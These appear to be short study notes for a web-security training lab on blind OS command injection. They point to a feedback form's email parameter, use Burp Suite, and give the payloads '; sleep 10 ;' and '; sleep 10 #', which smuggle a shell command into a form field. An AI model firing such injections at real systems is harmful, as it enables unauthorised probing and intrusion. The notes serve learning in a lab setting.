# Blind OS command injection with time delays

1. Command injection: feedback function.
2. Goal: 

### Analysis
- Web target: `https://0abd00e8049468b9808a216300780052.web-security-academy.net`
- Use Burp suite.
- `ctrl + u`: URL encode.

1. You should `submit feedback`.
2. Look at `email` parameter.
```bash
; sleep 10 ;
# or
; sleep 10 #
```